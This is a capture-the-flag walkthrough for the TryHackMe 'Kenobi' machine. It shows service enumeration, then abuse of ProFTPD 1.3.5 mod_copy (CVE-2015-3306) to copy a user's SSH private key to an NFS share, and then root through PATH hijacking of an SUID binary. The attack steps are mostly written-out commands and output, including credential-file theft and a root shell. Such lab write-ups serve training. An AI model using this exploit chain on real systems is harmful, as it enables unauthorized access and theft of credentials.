# Overview

Machine : [kenobi](https://tryhackme.com/room/kenobi)
Platform : [Tryhackme](https://tryhackme.com/)
Difficulty : Easy
Category : Linux & Network

# Enumeration

Starting with a simple Nmap scan to discover all open ports, services running on those ports, and OS information.

```bash
sudo nmap -T4 -Pn -n -sV -O 10.129.166.50
```

**Nmap Results:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-07 16:43 BST
Nmap scan report for 10.129.166.50
Host is up (0.0011s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2049/tcp open  nfs_acl     3 (RPC #100227)
```

Based on the OS fingerprinting and service versions, the target OS is Linux (Ubuntu 20.04 LTS x86_64).

Since we found SAMBA (SMB) ports open (139, 445), we can scan for users and shares to potentially find a valid user for initial access.

```bash
enum4linux-ng -S -U 10.129.166.50
```

**Enum4linux-ng Results**
```
 ============================================================
|    Domain Information via SMB session for 10.129.166.50    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: KENOBI

 =======================================
|    Shares via RPC on 10.129.166.50    |
 =======================================
[*] Enumerating shares
[+] Found 3 share(s):
IPC$:
  comment: IPC Service (kenobi server (Samba, Ubuntu))
  type: IPC
anonymous:
  comment: ''
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[*] Testing share anonymous
[+] Mapping: OK, Listing: OK
```

We found an accessible share named `anonymous`. We can log into SMB using `smbclient` with a blank password to investigate further:

```bash
smbclient //10.129.166.50/anonymous
```

Next, since port 2049 (NFS) is open, we can check for exported Network File System shares

```bash
showmount -e 10.129.166.50
```

**NFS**
```
Export list for 10.129.166.50:
/var *
```

We found that the `/var` directory is accessible over NFS. We can leverage this for initial access.

---

# Initial Access

During enumeration, we noticed the target is running an outdated FTP client: **ProFTPD 1.3.5**.

Searching for vulnerabilities reveals it is vulnerable to **CVE-2015-3306** This `mod_copy` vulnerability allows unauthenticated users to use the `SITE CPFR` (Copy From) and `SITE CPTO` (Copy To) commands to locate and copy files anywhere on the FTP server.

We will abuse this vulnerability to copy the `kenobi` user's SSH private key into the `/var` directory, which we know is accessible via our NFS share.

First, connect to the FTP server using netcat and issue the copy commands:

```bash
nc 10.129.166.50 21
```

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.129.166.50]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Now that the SSH key is copied to the NFS export folder (`/var/tmp`), we can mount the target's `/var` directory to our local attacking machine to retrieve the key.

Bash

```
# Create a local mount directory
mkdir /mnt/kenobiNFS

# Mount the target NFS share to the local directory
sudo mount 10.129.166.50:/var /mnt/kenobiNFS

# Copy the SSH key to our current working directory
cp /mnt/kenobiNFS/tmp/id_rsa .

# Set the correct permissions for the SSH key
chmod 600 id_rsa
```

With the private key secured, we can now establish an SSH connection to the target machine as the user `kenobi`.

```bash
ssh -i id_rsa kenobi@10.129.166.50
```

*Initial access achieved with flag* 
![image](../../images/ken-5_clean.png)

---

# Privilege Escalation

Now that we have a low-privileged shell, we need to search for ways to escalate our privileges to root. We start by searching for files with the SUID bit set.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Among the standard binaries, we find an unfamiliar file: `/usr/bin/menu`. When we run it, we are presented with a simple script menu:

```bash
/usr/bin/menu
```

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice: 1
```

When selecting option 1, it returns the HTTP headers of the local web server. This indicates the script is likely running the `curl -I localhost` command. Because the SUID binary is running `curl` without its absolute path (e.g., `/usr/bin/curl`), it is vulnerable to **Path Hijacking**.

We can abuse this by creating a fake `curl` executable that spawns a shell, and then manipulating our `$PATH` variable so the system runs our malicious `curl` instead of the real one.

```bash
# Navigate to the /tmp directory
cd /tmp

# Create a fake 'curl' file that executes a shell
echo /bin/sh > curl

# Make the fake 'curl' executable
chmod 777 curl

# Prepend the /tmp directory to the system PATH
export PATH=/tmp:$PATH

# Run the SUID binary again
/usr/bin/menu
```

When we select option 1 this time, the SUID binary attempts to run `curl`, finds our fake executable in `/tmp` first, and executes it with root privileges.
![image](../../images/ken-9_clean.png)
_Root shell obtained. Root flag captured._
![image](../../images/ken-10_clean.png)
